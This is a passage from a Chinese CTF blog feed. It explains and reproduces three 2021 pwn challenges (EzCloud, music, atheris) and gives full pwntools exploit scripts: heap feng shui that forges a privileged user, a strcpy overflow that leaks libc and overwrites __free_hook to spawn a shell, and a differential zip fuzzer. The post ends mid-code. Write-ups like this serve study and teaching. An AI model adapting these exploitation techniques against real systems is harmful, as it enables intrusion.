class="number">256</span>;</span><br><span class="line">    pos_j = (pos_j+sbox[pos_i])%<span class="number">256</span>;</span><br><span class="line">    temp = sbox[pos_i];</span><br><span class="line">    sbox[pos_i] = sbox[pos_j];</span><br><span class="line">    sbox[pos_j] = temp;</span><br><span class="line">    t = (sbox[pos_i]+sbox[pos_j])%<span class="number">256</span>;</span><br><span class="line">    <span class="keyword">return</span> sbox[t];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encryption</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *plaintext,<span class="keyword">unsigned</span> <span class="keyword">char</span> * result)</span></span>&#123;</span><br><span class="line">    pos_i = <span class="number">0</span>;</span><br><span class="line">    pos_j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)plaintext);</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    init_sbox();</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;++i)&#123;</span><br><span class="line">        result[i]=plaintext[i]^generate_key();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%x "</span>,result[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    result[i]=<span class="string">'\0'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;年初打的一场比赛，拿了第8名，把当时写的wp放到博客上来。&lt;/p&gt;
&lt;h3 id=&quot;reverse&quot;&gt;&lt;a href=&quot;#reverse&quot; class=&quot;headerlink&quot; title=&quot;reverse&quot;&gt;&lt;/a&gt;reverse&lt;/h3&gt;&lt;h4 id=&quot;1-decryp</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://veltavid.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>几道有意思的Pwn题的复现</title>
    <link href="https://veltavid.github.io/2021/08aa1d853a.html"/>
    <id>https://veltavid.github.io/2021/08aa1d853a.html</id>
    <published>2021-08-15T06:23:20.000Z</published>
    <updated>2021-08-17T08:32:07.801Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0-废话"><a href="#0-废话" class="headerlink" title="0.废话"></a>0.废话</h4><p>拖了好久终于建了自己的博客，第一篇博客决定先把之前打的几场比赛中我看的但没做出来的题复现了。由于本文的撰写时间与复现时间相隔太久，可能会疏漏一些细节。</p><h4 id="1-2021qwb-Ezcloud"><a href="#1-2021qwb-Ezcloud" class="headerlink" title="1. 2021qwb-Ezcloud"></a>1. 2021qwb-Ezcloud</h4><p>本题是一个http服务器程序。sub_9536是比较常规的http报文解析函数，它会返回一个指向解析结果结构体的指针，我们记作parsed_result。对于我们来说需要注意的字段只有Content-Type。当这个字段为application/x-www-form-urlencoded时，则服务器会将我们的报文内容进行url解码，然后把解码后的内容存入parsed_result[11]这个指针指向的堆块，并且parsed_result[13]处会存有数据长度。值得注意的是进行该操作的函数当a3为空时就不会进行任何操作。该函数在之后需要转存数据的地方都会用到，记该函数为strdup_a3_2_a1。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2021/08/15/xyE6Yf8AoMctP4Q.png" alt="image-20210815150353766" title="">                </div>                <div class="image-caption">image-20210815150353766</div>            </figure><p>若该字段内容为multipart/form-data，则不会parsed_result[11]与parsed_result[13]都将为0。</p><p>接着看下去，发现POST和GET方式都解析了/notepad这个路径，GET中还有一个/flag路径。</p><ul><li><p>/flag</p><p>/flag对应的处理函数会检查报文中Login-ID字段对应的用户权限是否为1来决定是否输出flag。</p><p><img src="https://i.loli.net/2021/08/15/IbsK3cYBkRvfLy1.png" alt="image-20210815152700098"></p><p>这里的用户集合使用链表来表示，表示单个用户的结构体如下所示。使用POST方式中的/login可以向用户链表插入用户节点。</p><p><img src="https://i.loli.net/2021/08/15/iDwrepacdLPIqvG.png" alt="image-20210815162043550"></p><p>因此我们的目标就是伪造一个权限为1的用户节点。</p></li><li><p>/notepad</p><p>这里出现了常规的菜单，如果是POST方式则允许我们增删改note，GET就是显示note内容。漏洞点共有2处，都在new note功能中。</p><p>第一个漏洞点是当用户节点中16个note都满了，且next域为空，则还会新增一个note覆盖掉用户节点的next域，这意味着攻击者能够伪造一个用户节点。</p><p><img src="https://i.loli.net/2021/08/15/KNIjPpWbQfCTL62.png" alt="image-20210815154000310"></p><p>第二个漏洞点在接下来的第一个strdup_a3_2_a1，若我们设置的Content-Type为multipart/form-data，则a1+88处的值为0，那么malloc出来的note就不会被初始化，则note的内容指针可能会指向一块堆块，只要这块堆块上残留了堆块指针，我们就能利用GET方式的notepad泄露出堆块地址。比赛时没发现这个洞，导致瞎堆风水了很久。</p><p><img src="https://i.loli.net/2021/08/15/zINxdoRuBZKYVTg.png" alt="image-20210815154449488"></p></li><li><p>利用思路</p><p>本题的难点在于虚假的用户节点内容不可控。因此为了获得可控的用户节点我们需要利用堆风水(玄学)做出一个合适的堆块布局，使得分配完0x20大小的note之后，接下来分配的存储note数据堆块正好在其之后，那么我们就可以覆盖虚假用户节点的next域，使其指向一块我们布置好数据的堆块区域。至于如何做就只能边调边试了，过程比较痛苦。exp如下所示。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(id_u,content,mode)</span>:</span></span><br><span class="line"><span class="keyword">if</span>(mode==<span class="number">1</span>):</span><br><span class="line">encoded_content=quote(content)</span><br><span class="line">base=<span class="string">"POST /notepad HTTP/1.1\r\nContent-Length: %d\r\nContent-Type: application/x-www-form-urlencoded\r\n"</span>%(len(encoded_content))</span><br><span class="line">base+=<span class="string">"Login-ID: %s\r\nNote-Operation: %s\r\n\r\n"</span>%(quote(id_u),quote(<span class="string">"new note"</span>))</span><br><span class="line">base+=encoded_content</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">base=<span class="string">"POST /notepad HTTP/1.1\r\nContent-Length: %d\r\nContent-Type: multipart/form-data\r\n"</span>%(len(content))</span><br><span class="line">base+=<span class="string">"Login-ID: %s\r\nNote-Operation: %s\r\n\r\n"</span>%(quote(id_u),quote(<span class="string">"new note"</span>))</span><br><span class="line">base+=content</span><br><span class="line">sh.send(base.ljust(<span class="number">0x10000</span>,<span class="string">'\x00'</span>))</span><br><span class="line">sh.recvuntil(<span class="string">'operation done!&lt;/p&gt;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(id_u,index)</span>:</span></span><br><span class="line">base=<span class="string">"POST /notepad HTTP/1.1\r\n"</span></span><br><span class="line">base+=<span class="string">"Login-ID: %s\r\nNote-ID: %d\r\nNote-Operation: %s\r\n\r\n"</span>%(quote(id_u),index,quote(<span class="string">"delete note"</span>))</span><br><span class="line">sh.send(base.ljust(<span class="number">0x10000</span>,<span class="string">'\x00'</span>))</span><br><span class="line">sh.recvuntil(<span class="string">'operation done!&lt;/p&gt;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(id_u,index,content)</span>:</span></span><br><span class="line">encoded_content=quote(content)</span><br><span class="line">base=<span class="string">"POST /notepad HTTP/1.1\r\nContent-Length: %d\r\nContent-Type: application/x-www-form-urlencoded\r\n"</span>%(len(encoded_content))</span><br><span class="line">base+=<span class="string">"Login-ID: %s\r\nNote-ID: %d\r\nNote-Operation: %s\r\n\r\n"</span>%(quote(id_u),index,quote(<span class="string">"edit note"</span>))</span><br><span class="line">base+=encoded_content</span><br><span class="line">sh.send(base.ljust(<span class="number">0x10000</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(id_u)</span>:</span></span><br><span class="line">encoded_content=quote(<span class="string">''</span>)</span><br><span class="line">base=<span class="string">"GET /notepad HTTP/1.1\r\nhost: 123\r\nContent-Length: %d\r\nContent-Type: application/x-www-form-urlencoded\r\n"</span>%(len(encoded_content))</span><br><span class="line">base+=<span class="string">"Login-ID: %s\r\nNote-Operation: %s\r\n\r\n"</span>%(quote(id_u),quote(<span class="string">"new note"</span>))</span><br><span class="line">base+=encoded_content</span><br><span class="line">sh.send(base.ljust(<span class="number">0x10000</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(id_u)</span>:</span></span><br><span class="line">base=<span class="string">"POST /login HTTP/1.1\r\nContent-Length: 4096\r\nLogin-ID: %s\r\n\r\n"</span>%(id_u)+<span class="string">"a"</span>*<span class="number">0x1000</span></span><br><span class="line">sh.send(base.ljust(<span class="number">0x10000</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">(id_u)</span>:</span></span><br><span class="line">base=<span class="string">"POST /logout HTTP/1.1\r\nLogin-ID: %s\r\nContent-Length: 0\r\n\r\n"</span>%(quote(id_u))</span><br><span class="line">sh.send(base.ljust(<span class="number">0x10000</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">'./EzCloud'</span>)</span><br><span class="line"></span><br><span class="line">login(<span class="string">"1234"</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">"1234"</span>,<span class="string">"a"</span>*<span class="number">0xf000</span>,<span class="number">1</span>)</span><br><span class="line">free(<span class="string">"1234"</span>,<span class="number">0</span>)</span><br><span class="line">print(<span class="string">'0'</span>)</span><br><span class="line">add(<span class="string">"1234"</span>,<span class="string">'a'</span>,<span class="number">0</span>)</span><br><span class="line">print(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="string">"1234"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"&lt;p&gt;\r\n&lt;p&gt;"</span>)</span><br><span class="line">heap_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))&amp;<span class="number">0xfffffffffffff000</span></span><br><span class="line">print(hex(heap_addr))</span><br><span class="line"></span><br><span class="line">login(<span class="string">"12345"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">add(<span class="string">"12345"</span>,<span class="string">"a"</span>*<span class="number">0x10</span>,<span class="number">1</span>)</span><br><span class="line">print(i)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">"a"</span>*<span class="number">0x60</span>+p64(heap_addr+<span class="number">0x6210</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(heap_addr+<span class="number">0x6220</span>)+<span class="string">"1234567\x00"</span>+p64(<span class="number">7</span>)</span><br><span class="line">add(<span class="string">"12345"</span>,payload.ljust(<span class="number">0x110</span>,<span class="string">'a'</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">base=<span class="string">"GET /flag HTTP/1.1\r\nHost: 192.168.23.131:2333\r\nLogin-ID: 1234567\r\n\r\n"</span></span><br><span class="line">sh.send(base.ljust(<span class="number">0x10000</span>,<span class="string">'\x00'</span>))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-2021tctf-music"><a href="#2-2021tctf-music" class="headerlink" title="2. 2021tctf-music"></a>2. 2021tctf-music</h4><p>本题给了一个补丁，将premtx改成了可循环使用的菜单程序。premtx的功能是将mtx格式文件转换成pmx文件，菜单允许我们生成mtx文件，以及将mtx文件转换成pmx文件。</p><p>这个项目的源码中使用了大量的strcpy和sprintf，但由于编译保护的关系都无法进行利用，因此我比赛时完全忽略了strcpy，导致一直找不到洞，还是太菜了。实际上漏洞点是multfile.c文件里pushFile函数中的strcpy(newnode-&gt;actualfile_NAME, filename)，由于编译器无法推断newnode-&gt;actualfile_NAME的长度，自然也无法进行保护。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2021/08/15/L32nWKyiPbc1YJp.png" alt="image-20210815164242464" title="">                </div>                <div class="image-caption">image-20210815164242464</div>            </figure><ul><li><p>泄露libc地址</p><p>查看手册可知，用include命令可以将任意文件包含到mtx文件中，然后开启debugMode就会输出文件的内容，造成任意文件读，当然我们不能读取flag文件，但我们可以读/proc/self/maps来泄露出libc地址。</p></li><li><p>堆风水</p><p>这题又需要使用堆风水构造出一个合适的布局，使得在一次转换中就能够实现堆块fd的改写与任意地址写。本题比上一题好的地方在于使用malloc与calloc的地方并不多，因此我们不需要靠玄学了。</p><p>总结一下可控的会使用alloc相关函数的地方有：</p><ul><li>multfile.c中的pushFile使用了malloc，分配堆块大小为0x1a0</li><li>两个菜单函数都使用了calloc</li><li>fopen固定分配0x1e0大小的堆块</li></ul><p>可控的free有：</p><ul><li>pushFile中打开文件失败时</li><li>multifile.c的popFile中</li><li>2个菜单函数的末尾</li><li>fclose</li></ul><p>实际调试时发现还会分配一些大于0x1000的堆块，但是影响不大就没分析是哪分配的了。为了避免这个影响我们先利用菜单的upload功能calloc一个0x1000大小的堆块，紧接着upload就会调用fopen分配一个0x1e0大小的堆块，0x1e0会进入tcache，所以最终0x1000大小堆块会进入unsorted bin。</p><p>然后我们再分配一些0x1e0大小的堆块专门提供给fopen使用，免得之后mtx转换pmx时导致我们的堆块不相邻。</p><p>为了任意写，我们需要保证0x1a0大小堆块的分配顺序是按从低到高地址来的，这样才能够溢出改fd并分配出我们想要的地址。由于溢出点是actualfile_NAME字段，我们可以控制include一个超长名字的文件来触发，所以发生溢出的堆块是第二块，因此我们需要布置的0x1a0大小堆块数目为3+1。上述顺序正好匹配了栈的特点，构造一个深度为4的文件栈就能够布置好tcache。我们总共需要调用3次转换函数，第一次用于泄露libc地址。第一次转换后堆块布局如下图所示。</p><p><img src="https://i.loli.net/2021/08/15/SYqrL4WPhsUdI9T.png" alt="image-20210815174134688"></p><p>第二次用于篡改fd，文件栈的深度为2。</p><p><img src="https://i.loli.net/2021/08/15/5DNPAkBvKH7hqWe.png" alt="image-20210815174159342"></p><p>最后构造一个深度为4的文件栈即可改free_hook为one_gadget拿shell。</p></li><li><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,content)</span>:</span></span><br><span class="line">sh.sendafter(<span class="string">"choice:"</span>,<span class="string">'1'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'Index:'</span>,str(index))</span><br><span class="line">sh.recvuntil(<span class="string">'Your filename: '</span>)</span><br><span class="line">file_name=sh.recvline()[:<span class="number">-1</span>]</span><br><span class="line">sh.sendafter(<span class="string">'length:'</span>,str(len(content)))</span><br><span class="line">sh.sendafter(<span class="string">'content:'</span>,content)</span><br><span class="line"><span class="keyword">return</span> file_name</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span><span class="params">(index,if_libc,if_ok)</span>:</span></span><br><span class="line">sh.sendafter(<span class="string">"choice:"</span>,<span class="string">'2'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'Index:'</span>,str(index))</span><br><span class="line"><span class="keyword">if</span>(if_libc):</span><br><span class="line">res=sh.recvuntil(<span class="string">'/usr/lib/x86_64-linux-gnu'</span>).split(<span class="string">'\n'</span>)[<span class="number">-1</span>]</span><br><span class="line">libc_base=int(res[<span class="number">5</span>:<span class="number">17</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">libc_base=<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">not</span> if_ok):</span><br><span class="line">sh.sendafter(<span class="string">'?[y/n]'</span>,<span class="string">'y'</span>)</span><br><span class="line"><span class="keyword">return</span> libc_base</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_f</span><span class="params">(index,path,size)</span>:</span></span><br><span class="line">content=<span class="string">"""Honky-Tonk: Voices RL LL AL BL CL DL EL FL GL HL IL JL; Clefs G F 1 2 3 4 5 6 7 8 9 10; Continuo</span></span><br><span class="line"><span class="string">Style: Honky-Tonk</span></span><br><span class="line"><span class="string">Name: Piano</span></span><br><span class="line"><span class="string">Meter: 4/4</span></span><br><span class="line"><span class="string">size: 29</span></span><br><span class="line"><span class="string">%% w120m</span></span><br><span class="line"><span class="string">enable: ignoreErrors</span></span><br><span class="line"><span class="string">enable: debugMode</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">content+=<span class="string">"include:%s\n\n"</span>%(path)</span><br><span class="line">c_len=len(content)</span><br><span class="line"><span class="keyword">while</span>(c_len&lt;size):</span><br><span class="line">content+=<span class="string">"g"</span>*<span class="number">14</span>+<span class="string">"|\n"</span></span><br><span class="line">c_len+=<span class="number">16</span></span><br><span class="line">file_name=add(index,content)</span><br><span class="line"><span class="keyword">return</span> file_name</span><br><span class="line"></span><br><span class="line">lib=ELF(<span class="string">'/usr/lib/x86_64-linux-gnu/libc-2.31.so'</span>)</span><br><span class="line">sh=process(<span class="string">'./chall'</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#sh=remote('127.0.0.1',12580)</span></span><br><span class="line"><span class="comment">#sh=remote('111.186.58.135',12580)</span></span><br><span class="line"></span><br><span class="line">f4=gen_f(<span class="number">4</span>,<span class="string">'/bin/sh'</span>,<span class="number">0x1000</span>)</span><br><span class="line">f0=gen_f(<span class="number">0</span>,<span class="string">'/proc/self/maps'</span>,<span class="number">0x1d0</span>)</span><br><span class="line">f1=gen_f(<span class="number">1</span>,<span class="string">'./'</span>+f0,<span class="number">0x1d0</span>)</span><br><span class="line">f2=gen_f(<span class="number">2</span>,<span class="string">'./'</span>+f1,<span class="number">0x1d0</span>)</span><br><span class="line"></span><br><span class="line">libc_base=gen(<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">print(hex(libc_base))</span><br><span class="line">free_hook=libc_base+lib.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">malloc_hook=libc_base+lib.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">system_addr=libc_base+lib.sym[<span class="string">'system'</span>]</span><br><span class="line">one_gadget=libc_base+<span class="number">0xe6e73</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">142</span>+p64(free_hook<span class="number">-0x120</span>)[:<span class="number">6</span>]</span><br><span class="line">payload2=<span class="string">'/bin/sh;'</span>+<span class="string">'a'</span>*<span class="number">6</span>+p64(one_gadget)[:<span class="number">6</span>]</span><br><span class="line">gen_f(<span class="number">3</span>,payload,<span class="number">0x250</span>)</span><br><span class="line">gen(<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">f5=gen_f(<span class="number">5</span>,payload2,<span class="number">0x200</span>)</span><br><span class="line">f6=gen_f(<span class="number">6</span>,f5,<span class="number">0x200</span>)</span><br><span class="line">gen_f(<span class="number">7</span>,f6,<span class="number">0x200</span>)</span><br><span class="line">gen(<span class="number">7</span>,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></li></ul><h4 id="3-2021googlectf-atheris"><a href="#3-2021googlectf-atheris" class="headerlink" title="3. 2021googlectf-atheris"></a>3. 2021googlectf-atheris</h4><p>本题是一个python写的服务器，它会接收一个zip压缩包。然后调用find_valid_autorun筛选出符合要求的py文件，随后运行它。</p><ul><li><p>find_valid_autorun</p><p>先使用zipfile库获取压缩包的内容信息，依次进行如下检验：</p><ul><li>文件名不能为空</li><li>文件名第一位不能为’/‘，也就是不能为绝对路径</li><li>文件名中不能包含’..’</li><li>文件类型不能为链接文件</li><li>不能包含Xceed Unicode Extra Field</li><li>不能包含Unicode Path Extra Field</li></ul><p>然后筛选出文件名以.autorun.py结尾的文件，然后获取.autorun.py前的87个字符，当成是base64编码后的签名，不是4的倍数是因为多取了一个’.’，再加上2个等号就是4的倍数了。若签名验证通过则会返回这个文件名。</p></li><li><p>解压运行</p><p>调用turbozipfile库解压zip压缩包，然后运行通过了检验的.autorun.py文件。</p></li><li><p>解题思路</p><p>通过readme可以猜测，漏洞位于turbozipfile库中。很显然不可能去分析二进制文件，结合题目名称可知必须通过fuzz定位漏洞，但我在比赛时瞎fuzz了很久都没有任何收获。赛后通过官方题解我又学到了一个新知识，差分fuzz是最适用于这种情况的，服务器中混用了2个功能类似的库，若他们的功能细节上存在些许不同就可能引发逻辑漏洞。编写差分fuzzer的思路也很普通，原先的libfuzzer是在fuzzer中调用待测库的函数，而差分fuzzer就是2个要比较的库的功能函数都调用，然后比较它们的结果有何不同，若是发现不同就抛出异常产生crash。以下是我照着官方fuzzer写的fuzzer。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> atheris</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> atheris.instrument_imports():</span><br><span class="line"><span class="keyword">import</span> turbozipfile</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@atheris.instrument_func</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">comp</span><span class="params">(left, right)</span>:</span></span><br><span class="line">  <span class="keyword">if</span> type(left) == str <span class="keyword">and</span> type(right) == bytes:</span><br><span class="line">    <span class="keyword">return</span> left.encode(<span class="string">"utf-8"</span>) == right</span><br><span class="line">  <span class="keyword">if</span> type(left) == bytes <span class="keyword">and</span> type(right) == str:</span><br><span class="line">    <span class="keyword">return</span> left == right.encode(<span class="string">"utf-8"</span>)</span><br><span class="line">  <span class="keyword">return</span> left == right</span><br><span class="line"></span><br><span class="line"><span class="meta">@atheris.instrument_func</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">TestOneInput</span><span class="params">(data)</span>:</span></span><br><span class="line"><span class="keyword">with</span> io.BytesIO(data) <span class="keyword">as</span> f:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">zf=zipfile.ZipFile(f)</span><br><span class="line">tf=turbozipfile.ZipFile(f)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">pinfos=zf.infolist()</span><br><span class="line">finfos=tf.infolist()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(pinfos) != len(finfos):</span><br><span class="line"><span class="keyword">raise</span> RuntimeError(<span class="string">"Info length disagreement"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(pinfos)):</span><br><span class="line">pinfo=pinfos[i]</span><br><span class="line">finfo=finfos[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> comp(pinfo.comment,finfo.comment):</span><br><span class="line"><span class="keyword">raise</span> RuntimeError(<span class="string">"comment disagreement"</span>)</span><br><span class="line"><span class="keyword">if</span> pinfo.compress_size != finfo.compress_size:</span><br><span class="line"><span class="keyword">raise</span> RuntimeError(<span class="string">"comment size disagreement"</span>)</span><br><span class="line"><span class="keyword">if</span> pinfo.compress_type != finfo.compress_type:</span><br><span class="line"><span class="keyword">raise</span> RuntimeError(<span class="string">"compress type disagreement"</span>)</span><br><span class="line"><span class="keyword">if</span> pinfo.external_attr != finfo.external_attr:</span><br><span class="line"><span class="keyword">raise</span> RuntimeError(<span class="string">"external_attr disagreement"</span>)</span><br><span class="line"><span class="keyword">if</span> pinfo.extra != finfo.extra:</span><br><span class="line"><span class="keyword">raise</span> RuntimeError(<span class="string">"extra disagreement"</span>)</span><br><span class="line"><span class="keyword">if</span> pinfo.file_size != finfo.file_size:</span><br><span class="line"><span class="keyword">raise</span> RuntimeError(<span class="string">"file size disagreement"</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> comp(pinfo.filename,finfo.filename):</span><br><span class="line"><span class="keyword">raise</span> RuntimeError(<span class="string">"filename disagreement: 